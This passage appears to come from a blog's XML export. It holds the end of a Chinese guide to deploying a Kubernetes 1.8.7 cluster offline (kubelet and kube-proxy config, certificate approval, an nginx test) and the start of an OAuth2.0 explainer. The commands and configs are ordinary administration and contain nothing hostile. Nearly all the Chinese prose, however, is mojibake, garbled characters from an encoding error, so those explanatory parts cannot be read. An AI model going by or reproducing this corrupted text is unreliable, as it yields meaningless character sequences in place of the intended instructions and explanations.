ServerDocumentation=https://github.com/GoogleCloudPlatform/kubernetesAfter=docker.serviceRequires=docker.service[Service]EnvironmentFile=-/etc/kubernetes/kubeletExecStart=/usr/local/bin/kubelet \ $KUBE_LOGTOSTDERR \ $KUBE_LOG_LEVEL \ $KUBELET_API_SERVER \ $KUBELET_ADDRESS \ $KUBELET_PORT \ $KUBELET_HOSTNAME \ $KUBE_ALLOW_PRIV \ $KUBELET_POD_INFRA_CONTAINER \ $KUBELET_ARGSRestart=on-failure[Install]WantedBy=multi-user.target åˆ›å»ºkubeletçš„é…ç½®æ–‡ä»¶/etc/kubernetes/kubelet(æ³¨æ„è¯·å°†--pod-infra-container-imageçš„å€¼æ›´æ¢æˆè‡ªå·±ç§æœ‰ä»“åº“å¯¹åº”pauseçš„é•œåƒåœ°å€):123456789101112131415161718192021##### kubernetes kubelet (minion) config### The address for the info server to serve on (set to 0.0.0.0 or "" for all interfaces)KUBELET_ADDRESS="--address=192.168.204.6"### The port for the info server to serve on#KUBELET_PORT="--port=10250"### You may leave this blank to use the actual hostnameKUBELET_HOSTNAME="--hostname-override=192.168.204.6"### location of the api-server## COMMENT THIS ON KUBERNETES 1.8+# KUBELET_API_SERVER="--api-servers=192.168.204.3:8080"### pod infrastructure containerKUBELET_POD_INFRA_CONTAINER="--pod-infra-container-image=192.168.204.15/kubernetes/pause-amd64:3.0"### Add your own!KUBELET_ARGS="--cgroup-driver=cgroupfs --cluster-dns=10.254.0.2 --experimental-bootstrap-kubeconfig=/etc/kubernetes/bootstrap.kubeconfig --kubeconfig=/etc/kubernetes/kubelet.kubeconfig --cert-dir=/etc/kubernetes/pki --cluster-domain=cluster.local --hairpin-mode promiscuous-bridge --serialize-image-pulls=false --runtime-cgroups=/systemd/system.slice --kubelet-cgroups=/systemd/system.slice --allow_privileged=true" æ³¨æ„: â€“allow_privileged=true å¿…é¡»ä¸ºtrue, ä¸ç„¶åé¢éƒ¨ç½²daemonSetçš„åº”ç”¨æ—¶ä¼šæ²¡æƒé™, æ¯”å¦‚ä¸‹é¢çš„æŠ¥é”™:12æœˆ 02 01:45:43 k8s-apiserver01 kubelet[17396]: W0202 01:45:43.550410 17396 config.go:350] Pod[1] (calico-node-5cvkj_kube-system(b0cd277f-07e4-11e8-a15f-fa163ee6f9f6)) from api failed validation, ignoring: spec.containers[0].securityContext.privileged: Forbidden: disallowed by cluster policy kubelet å¯åŠ¨æ—¶å‘ kube-apiserver å‘é€ TLS bootstrapping è¯·æ±‚ï¼Œéœ€è¦å…ˆå°† bootstrap token æ–‡ä»¶ä¸­çš„ kubelet-bootstrap ç”¨æˆ·èµ‹äºˆ system:node-bootstrapper cluster è§’è‰²(role)ï¼Œ ç„¶å kubelet æ‰èƒ½æœ‰æƒé™åˆ›å»ºè®¤è¯è¯·æ±‚(certificate signing requests):1234# æ³¨æ„ è¯·åœ¨masterèŠ‚ç‚¹ä¸Šæ‰§è¡Œ, nodeèŠ‚ç‚¹æ²¡æœ‰é…ç½®å®¢æˆ·ç«¯cd /etc/kubernetes &amp;&amp; kubectl create clusterrolebinding kubelet-bootstrap \ --clusterrole=system:node-bootstrapper \ --user=kubelet-bootstrap å¯åŠ¨æœåŠ¡:123456789# å¯åŠ¨å‰æ‰‹åŠ¨æ‹‰å–é•œåƒdocker pull index.tenxcloud.com/jimmy/pod-infrastructure:rhel7# å…³é—­swapswapoff -a# å¯åŠ¨æœåŠ¡systemctl daemon-reloadsystemctl enable kubeletsystemctl start kubeletsystemctl status kubelet kubelet é¦–æ¬¡å¯åŠ¨æ—¶å‘kube-apiserverå‘é€è¯ä¹¦ç­¾åè¯·æ±‚ï¼Œå¿…é¡»é€šè¿‡åkubernetesç³»ç»Ÿæ‰ä¼šå°†è¯¥NodeåŠ å…¥åˆ°é›†ç¾¤, å› æ­¤éœ€è¦åœ¨masterèŠ‚ç‚¹ä¸Šå¯¹è¿™äº›nodeçš„åŠ å…¥è¿›è¡Œå®¡è®¡, é€šè¿‡åä¼šè‡ªåŠ¨ä¸ºè¿™äº›nodeé¢å‘è¯ä¹¦12345678910# æŸ¥çœ‹æœªæˆæƒçš„CSRè¯·æ±‚$ kubectl get csrNAME AGE REQUESTOR CONDITIONnode-csr-D0qfDbLl4sA2uFOuEkEXt0pqYr0DjqCTNqxyaocvgq0 30m kubelet-bootstrap Pending# é€šè¿‡CSRè¯·æ±‚$ kubectl certificate approve node-csr-D0qfDbLl4sA2uFOuEkEXt0pqYr0DjqCTNqxyaocvgq0# æŸ¥çœ‹æ‰åŠ å…¥çš„node$ kubectl get nodesNAME STATUS ROLES AGE VERSION192.168.204.6 Ready &lt;none&gt; 47s v1.8.7 éƒ¨ç½²kub-proxyKube-proxy æ˜¯å®ç°Serviceçš„å…³é”®ç»„ä»¶, kube-proxyä¼šåœ¨æ¯å°èŠ‚ç‚¹ä¸Šæ‰§è¡Œ, ç„¶åç›‘å¬API Serverçš„Serviceä¸Endpointèµ„æºå¯¹è±¡çš„æ”¹å˜, ç„¶åæ¥ä¾æ®å˜åŒ–æ‰§è¡Œiptablesæ¥å®ç°ç½‘ç»œçš„è½¬å‘ã€‚ åˆ›å»º kube-proxy çš„serviceé…ç½®æ–‡ä»¶: /usr/lib/systemd/system/kube-proxy.service123456789101112131415161718[Unit]Description=Kubernetes Kube-Proxy ServerDocumentation=https://github.com/GoogleCloudPlatform/kubernetesAfter=network.target[Service]EnvironmentFile=-/etc/kubernetes/configEnvironmentFile=-/etc/kubernetes/proxyExecStart=/usr/local/bin/kube-proxy \ $KUBE_LOGTOSTDERR \ $KUBE_LOG_LEVEL \ $KUBE_MASTER \ $KUBE_PROXY_ARGSRestart=on-failureLimitNOFILE=65536[Install]WantedBy=multi-user.target kube-proxyé…ç½®æ–‡ä»¶/etc/kubernetes/proxy1234567#### kubernetes proxy config# default config should be adequate# Add your own!KUBE_PROXY_ARGS="--bind-address=192.168.204.6 --hostname-override=192.168.204.6 --kubeconfig=/etc/kubernetes/kube-proxy.kubeconfig --cluster-cidr=10.254.0.0/16" å¯åŠ¨æœåŠ¡:1234567891011systemctl daemon-reloadsystemctl enable kube-proxysystemctl start kube-proxysystemctl status kube-proxy$ netstat -tlnup | grep kubtcp 0 0 192.168.204.6:10250 0.0.0.0:* LISTEN 12437/kubelettcp 0 0 192.168.204.6:10255 0.0.0.0:* LISTEN 12437/kubelettcp 0 0 192.168.204.6:4194 0.0.0.0:* LISTEN 12437/kubelettcp 0 0 127.0.0.1:10248 0.0.0.0:* LISTEN 12437/kubelettcp 0 0 127.0.0.1:10249 0.0.0.0:* LISTEN 12776/kube-proxytcp6 0 0 :::10256 :::* LISTEN 12776/kube-proxy å‰©ä¸‹çš„2ä¸ªnodeèŠ‚ç‚¹: 192.168.204.å’Œ192.168.204.14, 192.168.204.3å¦‚æ³•ç‚®åˆ¶, ç„¶åæˆ‘ä»¬åœ¨masterçœ‹çœ‹æ‰€æœ‰å·²ç»æ·»åŠ å¥½çš„nodeèŠ‚ç‚¹:123456[root@k8s-apiserver01 docker]# kubectl get nodesNAME STATUS ROLES AGE VERSION192.168.204.3 Ready &lt;none&gt; 54m v1.8.7192.168.204.4 Ready &lt;none&gt; 3d v1.8.7192.168.204.6 Ready &lt;none&gt; 3d v1.8.7192.168.204.7 Ready &lt;none&gt; 3d v1.8.7 é›†ç¾¤æµ‹è¯•æˆ‘ä»¬é€šè¿‡éƒ¨ç½²ä¸€ä¸ªnginxæœåŠ¡æ¥éªŒè¯é›†ç¾¤æ˜¯å¦æ­£å¸¸å·¥ä½œ:ä¸ºäº†åŠ å¿«éªŒè¯çš„æ•ˆæœ, æˆ‘ä»¬å…ˆåœ¨nodeèŠ‚ç‚¹ä¸Šæ‹‰å–nginxçš„é•œåƒ:1docker pull nginx ç„¶ååœ¨masterèŠ‚ç‚¹ä¸Šéƒ¨ç½²æœåŠ¡ï¼Œå¹¶æš´éœ²å‡ºæ¥:12345678910111213141516171819$ kubectl run nginx --replicas=2 --labels="run=load-balancer-example" --image=nginx --port=80deployment "nginx" created$ kubectl expose deployment nginx --type=NodePort --name=example-serviceservice "example-service" exposed$ kubectl describe svc example-serviceName: example-serviceNamespace: defaultLabels: run=load-balancer-exampleAnnotations: &lt;none&gt;Selector: run=load-balancer-exampleType: NodePortIP: 10.254.100.109Port: &lt;unset&gt; 80/TCPTargetPort: 80/TCPNodePort: &lt;unset&gt; 30924/TCPEndpoints: 172.30.52.2:80,172.30.52.3:80Session Affinity: NoneExternal Traffic Policy: ClusterEvents: &lt;none&gt; ç„¶åè®¿é—®æš´éœ²å‡ºæ¥çš„æœåŠ¡:1234567891011121314151617181920212223242526[root@k8s-apiserver01 ~]# curl 192.168.204.6:30924&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Welcome to nginx!&lt;/title&gt;&lt;style&gt; body &#123; width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;&lt;p&gt;If you see this page, the nginx web server is successfully installed andworking. Further configuration is required.&lt;/p&gt;&lt;p&gt;For online documentation and support please refer to&lt;a href="http://nginx.org/"&gt;nginx.org&lt;/a&gt;.&lt;br/&gt;Commercial support is available at&lt;a href="http://nginx.com/"&gt;nginx.com&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; æ€»ç»“ç»è¿‡è¿™ç¯‡åšå®¢, æˆ‘ä»¬æˆåŠŸéƒ¨ç½²äº†ä¸€ä¸ª4ä¸ªèŠ‚ç‚¹çš„kubernetes 1.8.7çš„é›†ç¾¤, ä½†æ˜¯æ­¤æ—¶é›†ç¾¤çš„ç½‘ç»œ, DNS, DashBoard, ç›‘æ§éƒ½è¿˜æ²¡å®Œæˆ, åœ¨æ¥ä¸‹æ¥çš„kubernetes 1.8.7 ç¦»çº¿éƒ¨ç½²æ‰‹å†Œ(äºŒ)ä¸­å°†è¿›è¡Œè¿™äº›ç»„ä»¶çš„éƒ¨ç½²ã€‚]]></content>
      <categories>
        <category>è¿ç»´</category>
        <category>kubernetes</category>
      </categories>
      <tags>
        <tag>kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OAuth2.0æˆæƒæœºåˆ¶è¯¦è§£]]></title>
    <url>%2F2017%2F12%2F07%2Foauth2%2F</url>
    <content type="text"><![CDATA[å½“ä»Šäº’è”ç½‘çš„åŠŸèƒ½å¯è°“æ˜¯äº”èŠ±å…«é—¨, è€Œå¾ˆå¤šæœåŠ¡éœ€è¦ä¾èµ–ç”¨æˆ·å·²æœ‰çš„æ•°æ®æ‰èƒ½æä¾›æœåŠ¡, æ¯”å¦‚äº‘å†²å°, éœ€è¦è®¿é—®ç”¨æˆ·äº‘ç›˜é‡Œé¢çš„ç…§ç‰‡æ•°æ®, å†æ¯”å¦‚ciæœåŠ¡, éœ€è¦è®¿é—®ç”¨æˆ·ä»£ç ä»“åº“é‡Œé¢çš„é¡¹ç›®æ•°æ®ã€‚å¦‚ä½•å®‰å…¨å¾—å°†ç”¨æˆ·çš„æ•°æ®æš´éœ²ç»™ç¬¬ä¸‰æ–¹åº”ç”¨è®¿é—®æ˜¯ä¸€ä¸ªå¾ˆå¸¸è§çš„éœ€æ±‚, è€ŒOAuthçš„å‡ºç°å°±æ˜¯è§£å†³è¿™ç±»é—®é¢˜çš„ã€‚ ä¼ ç»Ÿè®¤è¯çš„é—®é¢˜åœ¨ä¼ ç»Ÿçš„client-serverèº«ä»½è®¤è¯æ¨¡å‹ä¸­, å®¢æˆ·ç«¯é€šè¿‡èµ„æºæ‰€æœ‰è€…(resource owner)çš„å‡­è¯æ¥è®¿é—®æœåŠ¡ç«¯çš„å—ä¿æŠ¤çš„èµ„æºï¼Œ ä¸ºäº†è®©ç¬¬ä¸‰æ–¹åº”ç”¨è®¿é—®å—é™èµ„æºï¼Œ åˆ™ç¬¬ä¸‰æ–¹åº”ç”¨å¿…é¡»åˆ†äº«èµ„æºæ‰€æœ‰è€…çš„å‡­è¯,è¿™å°±äº§ç”Ÿäº†ä¸€äº›é—®é¢˜å’Œå±€é™æ€§ï¼š Third-party appéƒ½éœ€è¦å­˜å‚¨resource ownerçš„å‡­è¯(credentials), ä»¥å¤‡å°†æ¥ä¹‹ç”¨, è€Œcredentialså¾€å¾€éƒ½æ˜¯æ˜æ–‡ serverså¿…é¡»æ”¯æŒcredentialè®¤è¯ï¼Œä¹Ÿå°±æ˜¯ç”¨æˆ·å/å¯†ç çš„è®¤è¯ Third-party appè·å–çš„è®¿é—®resource ownerçš„æ‰€æœ‰èµ„æºçš„æƒé™ï¼Œå¹¶ä¸”æ— æ—¶é—´å’Œå­é›†é™åˆ¶ resource ownerä¸èƒ½å•ç‹¬æ’¤é”€æŸä¸€ä¸ªThird-party appçš„èµ„æºè®¿é—®æƒé™ï¼Œè€Œæ’¤é”€æ–¹æ³•åªèƒ½é€šè¿‡ä¿®æ”¹credentialå®Œæˆï¼Œè¿™å°†æ’¤é”€æ‰æ‰€æœ‰Third-party appçš„èµ„æºè®¿é—®æƒé™ ä»»ä½•ä¸€ä¸ª Third-party app çš„å¯†ç æ³„éœ²ï¼Œéƒ½å°†å¯¼è‡´ç”¨æˆ·æ•°æ®çš„æ³„éœ² ä¸¾ä¸€ä¸ªç®€å•ä¸€ç‚¹çš„æ —å­: ä½ æœ‰ä¸€åº§åˆ«å¢…, è¿™ä¸ªåˆ«å¢…æ˜¯ä½ çš„èµ„äº§, æ¸…æ´å…¬å¸æä¾›åˆ«å¢…æ¸…æ´æœåŠ¡(ç¬¬ä¸‰æ–¹æœåŠ¡å•†), å›­è‰ºå…¬å¸æä¾›ä¿®å‰ªèŠ±å›­çš„æœåŠ¡(ç¬¬ä¸‰æ–¹æœåŠ¡å•†), è€Œè¿›å…¥ä½ åˆ«å¢…çš„å‡­è¯å°±æ˜¯åˆ«å¢…çš„é’¥åŒ™, å¦‚æœä½ ç›´æ¥å°†é’¥åŒ™(èµ„äº§è®¿é—®å‡­è¯)ç»™è¿™2ä¸ªæœåŠ¡å•†, è¿™æ˜¯å¾ˆå±é™©çš„, å› ä¸ºä»–ä»¬ä¹Ÿå¯ä»¥å¤åˆ¶ä½ çš„é’¥åŒ™, æ­¤æ—¶ä½ çš„åˆ«å¢…çš„å®‰å…¨ä½“ç³»å°±å´©å¡Œäº†, å‡å¦‚ä½ çœŸçš„å¾ˆä¿¡ä»»ä»–ä»¬, ä½†æ˜¯å¦‚æœå›­è‰ºå…¬å¸çš„äººæœ‰é—®é¢˜, ä»–å¯èƒ½ç›—èµ°äº†ä½ ç»™ä»–çš„é’¥åŒ™, æ­¤æ—¶å’‹åŠ, å”¯æœ‰æ¢é”, ä½†æ˜¯é”æ¢äº† åˆ«å¢…çš„æ¸…æ´æœåŠ¡ä¹Ÿä¼šå—åˆ°å½±å“, å› æ­¤ä½ ä¼šå‘ç° æŠŠé’¥åŒ™ç›´æ¥ç»™ç¬¬ä¸‰æ–¹æ˜¯å¾ˆä¸å®‰å…¨çš„, ä¼šå¼•å‘å¾ˆå¤šå®‰å…¨éšæ‚£é—®é¢˜ã€‚ OAuth2çš„è§£å†³æ€è·¯å¯¹äºä¸Šé¢çš„æ —å­, å½“æœ‰å¤šä¸ªç¬¬ä¸‰æ–¹æœåŠ¡å•†è¦è®¿é—®æˆ‘ä»¬çš„èµ„æºæ—¶(è¿›å…¥åˆ«å¢…), ä»…é€šè¿‡1æŠŠé”çš„æ–¹å¼æ¥ä¿è¯èµ„äº§çš„å®‰å…¨è®¿é—®æ˜¯å¾ˆæˆé—®é¢˜çš„, å› æ­¤æˆ‘ä»¬éœ€è¦ä¸€å±‚ä¸­é—´å±‚æ¥ç®¡ç†è¿™äº›äººçš„è®¿é—®æƒé™, å¸¸è§çš„åšæ³•æ˜¯æ‹›ä¸€ä¸ªç®¡å®¶, æ¯æ¬¡è®¿é—®æ—¶ç”±ç®¡å®¶è¯¢é—®åˆ«å¢…ä¸»äººè¿›è¡Œæˆæƒã€‚ OAuthçš„å®ç°æ–¹å¼ä¸æ­¤ç±»ä¼¼, OAuthåœ¨â€å®¢æˆ·ç«¯â€(ç¬¬ä¸‰æ–¹æœåŠ¡)ä¸â€æœåŠ¡æä¾›å•†â€(ç”¨æˆ·è‡ªå·±çš„èµ„äº§æœåŠ¡)ä¹‹é—´ï¼Œè®¾ç½®äº†ä¸€ä¸ªæˆæƒå±‚(ç±»ä¼¼äºä¸Šé¢çš„ç®¡å®¶)ã€‚â€å®¢æˆ·ç«¯â€ä¸èƒ½ç›´æ¥ç™»å½•â€æœåŠ¡æä¾›å•†â€(ç¬¬ä¸‰æ–¹æ— æ³•ç›´æ¥è¿›å…¥åˆ«å¢…), åªèƒ½ç™»å½•æˆæƒå±‚(è¯¢é—®ç®¡å®¶)ï¼Œä»¥æ­¤å°†ç”¨æˆ·(èµ„äº§çš„ä¸»äºº)ä¸å®¢æˆ·ç«¯(ç¬¬ä¸‰æ–¹)åŒºåˆ†å¼€æ¥ã€‚ â€œå®¢æˆ·ç«¯â€ç™»å½•æˆæƒå±‚æ‰€ç”¨çš„ä»¤ç‰Œ(token), ä¸ç”¨æˆ·çš„å¯†ç ä¸åŒã€‚ç”¨æˆ·å¯ä»¥åœ¨ç™»å½•çš„æ—¶å€™ï¼ŒæŒ‡å®šæˆæƒå±‚ä»¤ç‰Œçš„æƒé™èŒƒå›´å’Œæœ‰æ•ˆæœŸã€‚â€å®¢æˆ·ç«¯â€ç™»å½•æˆæƒå±‚ä»¥åï¼Œâ€æœåŠ¡æä¾›å•†â€æ ¹æ®ä»¤ç‰Œçš„æƒé™èŒƒå›´å’Œæœ‰æ•ˆæœŸï¼Œå‘â€å®¢æˆ·ç«¯â€å¼€æ”¾ç”¨æˆ·èµ„äº§è®¿é—®çš„æƒé™ã€‚ å…·ä½“è¿‡ç¨‹å¯ä»¥ç”¨ä»¥ä¸‹è¿™å¼ å›¾æ¥æè¿°(å›¾ä¸­clientå°±ä»£è¡¨ä¸­é—´å±‚): OAuth2ç®€ä»‹OAuth(å¼€æ”¾æˆæƒ)æ˜¯ä¸€ä¸ªå¼€æ”¾æ ‡å‡†ï¼Œå…è®¸ç”¨æˆ·è®©ç¬¬ä¸‰æ–¹åº”ç”¨è®¿é—®è¯¥ç”¨æˆ·åœ¨æŸä¸€ç½‘ç«™ä¸Šå­˜å‚¨çš„ç§å¯†çš„èµ„æº(å¦‚ç…§ç‰‡ï¼Œè§†é¢‘ï¼Œè”ç³»äººåˆ—è¡¨)ï¼Œè€Œæ— éœ€å°†ç”¨æˆ·åå’Œå¯†ç æä¾›ç»™ç¬¬ä¸‰æ–¹åº”ç”¨ã€‚ OAuth1.0åœ¨2007å¹´çš„12æœˆåº•å‘å¸ƒå¹¶è¿…é€Ÿæˆä¸ºå·¥ä¸šæ ‡å‡†, åœ¨OAuth1.0ä¸­é€šè¿‡HMACå’Œtoken secretåŠ å¯†å¹¶å‘é€çš„æ–¹å¼ä¸ºç¬¬ä¸‰æ–¹åº”ç”¨é¢å‘ä¸€ä¸ªæœ‰æ•ˆæœŸéå¸¸é•¿çš„token(å…¸å‹çš„æ˜¯ä¸€å¹´æœ‰æ•ˆæœŸæˆ–è€…æ— æœ‰æ•ˆæœŸé™åˆ¶)ã€‚ OAuth2.0åœ¨2012å¹´10æœˆåè®®æ­£å¼å‘å¸ƒä¸ºRFC 6749. ç°åœ¨å¾ˆå¤šå¼€æ”¾å¹³å°éƒ½æ˜¯ä½¿ç”¨çš„OAuth 2.0åè®®ä½œä¸ºæ”¯æ’‘ã€‚æ¯”å¦‚ç™¾åº¦å¼€å‘å¹³å°, å¾®è–„å¼€æ”¾å¹³å°, å¾®ä¿¡å¼€æ”¾å¹³å°, Googleä»¥åŠFacebookçš„å¼€æ”¾æœåŠ¡, æ˜¾ç„¶OAuth2.0å·²ç»æˆä¸ºäº†ä¸‹ä¸€ä»£çš„â€œç”¨æˆ·éªŒè¯å’Œæˆæƒâ€çš„äº’è”ç½‘æ ‡å‡†åè®®ã€‚ä½†æ˜¯, å€¼å¾—æ³¨æ„çš„æ˜¯OAuth 2.0 çš„å‡ºç°ï¼Œå°†å®Œå…¨å–ä»£OAuth 1.0, å¹¶ä¸”2.0å®Œå…¨ä¸å…¼å®¹1.0ï¼Œ æ‰€æœ‰1.0å°†åºŸå¼ƒã€‚ ç›¸å¯¹äºOAuth1.0ä¸­å‘è¡Œä¸€ä¸ªæœ‰æ•ˆæœŸéå¸¸é•¿çš„token, OAuth2.0é‡‡ç”¨çŸ­æœ‰æ•ˆæœŸtoken(access token)å’Œé•¿ç”Ÿå‘½å‘¨æœŸ(refresh token)çš„æ–¹å¼, è¿™å°†å…è®¸å®¢æˆ·ç«¯æ— éœ€ç”¨æˆ·å†æ¬¡æ“ä½œè€Œè·å–ä¸€ä¸ªæ–°çš„access tokenï¼Œå¹¶ä¸”ä¹Ÿé™åˆ¶äº†access tokençš„æœ‰æ•ˆæœŸã€‚ OAuth2.0å°†è§’è‰²è¿›è¡Œäº†æ‹†åˆ†, åˆ†ä¸º: Authorization Server: è´Ÿè´£è·å–ç”¨æˆ·çš„æˆæƒå¹¶ä¸”å‘å¸ƒtoken Resource Server: è´Ÿè´£å¤„ç†API calls åœ¨æ‰©å±•æ€§ä¸Šå¾—åˆ°äº†è¿›ä¸€æ­¥æå‡, è€Œä¸”è¿™ç§æ–¹å¼æå…¶æ–¹ä¾¿å¼€å‘åˆ†å¸ƒå¼åº”ç”¨, æ˜¯å¾®æœåŠ¡æ—¶ä»£æˆæƒä¸­å¿ƒçš„ä¸äºŒä¹‹é€‰ã€‚ OAuth2çš„åº”ç”¨åœºæ™¯ç°åœ¨å¾ˆå¤šç½‘ç«™éƒ½å…è®¸é€šè¿‡Google, QQ, æ–°æµª, å¾®ä¿¡ç­‰è´¦å·ç›´æ¥ç™»å½•ç½‘ç«™ï¼Œè¿™å°±æ˜¯OAuthæœ€å¸¸è§çš„ä¸€ç§ä½¿ç”¨åœºæ™¯ï¼Œä»–è®©ç¬¬ä¸‰æ–¹åº”ç”¨è®¿é—®ä½ å­˜å‚¨åœ¨QQæˆ–è€…å¾®ä¿¡ä¸Šçš„ç”¨æˆ·ä¿¡æ¯, æ¯”å¦‚æ‹‰å‹¾ç½‘:å½“ä½ ç‚¹å‡»ä»»æ„ä¸€ä¸ªæ—¶, éƒ½å°†ä¼šè·³è½¬åˆ°ä»–ä»¬çš„è®¤è¯æœåŠ¡å™¨è¿›è¡Œè®¤è¯, æ‰€ä»¥ç¬¬ä¸‰æ–¹åº”ç”¨æ˜¯ä¸ä¼šè·å–ç”¨æˆ·çš„credential(ç”¨æˆ·åå’Œå¯†ç ), å¹¶ä¸”å¯ä»¥é€‰æ‹©å“ªäº›èµ„æºè¢«è®¿é—®ï¼Œ è€Œä¸”è®¿é—®ä¹Ÿæ˜¯æœ‰æ—¶æ•ˆæ€§çš„ï¼Œ ä¸€èˆ¬åœ¨1å°æ—¶æˆ–è€…2ä¸ªå°æ—¶å è®¿é—®tokenå°±ä¼šè¿‡æœŸã€‚ å‡¡æ˜¯ç”¨æˆ·è‡ªå·±çš„æ•°æ®, éƒ½å¯ä»¥é€šè¿‡OAuth2æ¥å¼€æ”¾ç»™ç¬¬ä¸‰æ–¹åº”ç”¨è®¿é—®, ä¸Šé¢è¿™ç§é€šè¿‡è®¿é—®ç”¨æˆ·çš„profileä¿¡æ¯å®ç°ç¬¬ä¸‰æ–¹ç™»å½•ä»…ä»…æ˜¯æ¯”è¾ƒæ™®éè€Œå·², ä½ ä¹Ÿå¯ä»¥åˆ†äº«ä½ å¯¹èµ„æºçš„å…¶ä»–æƒé™, æ¯”å¦‚å¾®è–„å¯ä»¥è®©ç¬¬ä¸‰æ–¹åº”ç”¨è®¿é—®ç”¨æˆ·å‘è¡¨å¾®è–„,ä»¥åŠåˆ†äº«å¾®è–„: æ€»ä¹‹é€šè¿‡OAuth2.0ç”¨æˆ·å¯ä»¥é€‰æ‹©æ€§çš„æš´éœ²è‡ªå·±çš„ä¿¡æ¯, ç”šè‡³æ˜¯APIçš„è®¿é—®æƒé™ã€‚æ¯”å¦‚æˆæƒæŸäº›ç¬¬ä¸‰æ–¹åº”ç”¨å¯ä»¥åˆ é™¤ä½ çš„å¾®è–„ä¿¡æ¯ã€‚ OAuth2çš„æˆæƒæµç¨‹åœ¨OAuth 2.0å®šä¹‰äº†4ç§è§’è‰²ï¼Œä»¥ä¸Šé¢æåˆ°çš„åº”ç”¨åœºæ™¯çš„ä¾‹å­è¿›è¡Œè¯´æ˜: Resource Owner: èµ„æºæ‰€æœ‰è€…ï¼Œè¿™é‡ŒæŒ‡çš„QQçš„æœ€ç»ˆç”¨æˆ·æˆ‘ï¼Œ è€Œèµ„æºæŒ‡æˆ‘å­˜å‚¨åœ¨QQæœåŠ¡é‡Œé¢çš„ä¸€äº›ä¸ªäººä¿¡æ¯: æ˜µç§°ã€å¤´åƒã€æ€§åˆ«ç­‰ã€‚ Resource Server: èµ„æºæœåŠ¡å™¨ï¼ŒåŠä¿å­˜æˆ‘qqæ˜µç§°ã€å¤´åƒã€æ€§åˆ«è¿™äº›èµ„æºçš„åç«¯æœåŠ¡, ä¸€èˆ¬éœ€è¦é€šè¿‡access_tokenæ¥è®¿é—®è¿™äº›å—ä¿æŠ¤çš„èµ„æºã€‚ Client: ç¬¬ä¸‰æ–¹åº”ç”¨ï¼Œ è¿™é‡ŒæŒ‡ä»£æ‹‰é’©ç½‘ Authorization Server: æˆæƒæœåŠ¡å™¨ï¼Œè¿™é‡ŒæŒ‡qqçš„æˆæƒæœåŠ¡å™¨, åŠæä¾›æˆæƒç¡®è®¤é¡µé¢çš„åç«¯æˆæƒæœåŠ¡ã€‚å½“ç”¨æˆ·è®¤è¯å’ŒæˆæƒæˆåŠŸå,ç”±è¯¥æœåŠ¡å‘client(ç¬¬ä¸‰æ–¹åº”ç”¨)é¢å‘access_token æˆæƒæµç¨‹å›´ç»•ç€è¿™4ä¸ªæ¦‚å¿µ, æˆ‘ä»¬æ¥è¯´æ˜ä¸‹OAuth2.0çš„æˆæƒæµç¨‹: ç¬¬ä¸‰æ–¹åº”ç”¨è¯·æ±‚èµ„æºæ‰€æœ‰è€…æˆæƒ, æˆæƒè¯·æ±‚å¾€å¾€é€šè¿‡ä¸­è½¬åˆ°æˆæƒæœåŠ¡æ¥éªŒè¯èµ„æºæ‰€æœ‰è€…çš„èº«ä»½, æ¯”å¦‚åº”ç”¨åœºæ™¯é‡Œé¢é‚£äº›éœ€è¦ç”¨æˆ·ç™»å½•çš„é¡µé¢ ç¬¬ä¸‰æ–¹åº”ç”¨è·å¾—èµ„æºæ‰€æœ‰è€…çš„æˆæƒ, æ¯”å¦‚åº”ç”¨åœºæ™¯é‡Œé¢éœ€è¦ç”¨æˆ·ç‚¹å‡»çš„æˆæƒæŒ‰é’®, OAuth2å®šä¹‰äº†4ç§æˆæƒçš„æ–¹å¼,ç®€ç§°æˆæƒæ¨¡å¼, åé¢é©¬ä¸Šè®²åˆ°,å½“ç„¶ä½ ä¹Ÿå¯ä»¥æ‰©å±•è‡ªå·±çš„æˆæƒæ¨¡å¼ã€‚ ç¬¬ä¸‰æ–¹åº”ç”¨æ ¹æ®ç”¨æˆ·çš„æˆæƒ å‘æˆæƒæœåŠ¡ è¯·æ±‚è®¿é—®èµ„æºçš„token æˆæƒæœåŠ¡ æ ¹æ®ç”¨æˆ·çš„æˆæƒ è¿”å›ç»™ç¬¬ä¸‰æ–¹åº”ç”¨è®¿é—®èµ„æºçš„token ç¬¬ä¸‰æ–¹åº”ç”¨æ ¹æ®è·å–åˆ°çš„token å‘èµ„æºæœåŠ¡ è¯·æ±‚èµ„æº èµ„æºæœåŠ¡ å“åº”èµ„æºç»™ç¬¬ä¸‰æ–¹åº”ç”¨ ç”±æ­¤å¯è§æµç¨‹çš„å…³é”®åœ¨äºç¬¬äºŒéƒ¨(2), å› ä¸ºè¿™é‡Œæ˜¯Authorization layer, å®ƒå†³å®šäº†ç”¨æˆ·æä¾›çš„æˆæƒæ‰¹å‡†ä¿¡æ¯ä»¥ä½•ç§å½¢å¼è¿”å›ç»™clientè®©å…¶å‡­å€Ÿæ­¤ä¿¡æ¯è·å–è®¿é—®ä»¤ç‰Œ(access token) å®¢æˆ·ç«¯çš„æˆæƒæ¨¡å¼æˆæƒè®¸å¯(Authorization Grant)æ˜¯ä¸€ä¸ªä»£è¡¨èµ„æºæ‰€æœ‰è€…è®¿é—®è‡ªå·±èµ„æºçš„ä¸€ç§å‡­è¯, ç”¨äºç¬¬ä¸‰æ–¹åº”ç”¨ç”³è¯·è®¿é—®ä»¤ç‰Œ(access token), oauthå®šä¹‰äº†4ç§æˆæƒæ¨¡å¼: æˆæƒç æ¨¡å¼ï¼ˆauthorization codeï¼‰ ç®€åŒ–æ¨¡å¼ï¼ˆimplicitï¼‰ å¯†ç æ¨¡å¼ï¼ˆresource owner password credentialsï¼‰ å®¢æˆ·ç«¯æ¨¡å¼ï¼ˆclient credentialsï¼‰ æ¯ä¸€ç§æ¨¡å¼åº”å¯¹ä¸åŒçš„æˆæƒåœºæ™¯, å¦‚æœoauthå®šä¹‰çš„è¿™4ç§æ¨¡å¼æ— æ³•æ»¡è¶³ä½ çš„æˆæƒéœ€æ±‚, ä½ å¯ä»¥è‡ªå®šä¹‰ä¸€ç§æˆæƒæ¨¡å¼è¿›è¡Œå®ç°, å› æ­¤çµæ´»æ€§ä¸Šæœ‰å¾ˆå¤§çš„ä¿è¯ã€‚ 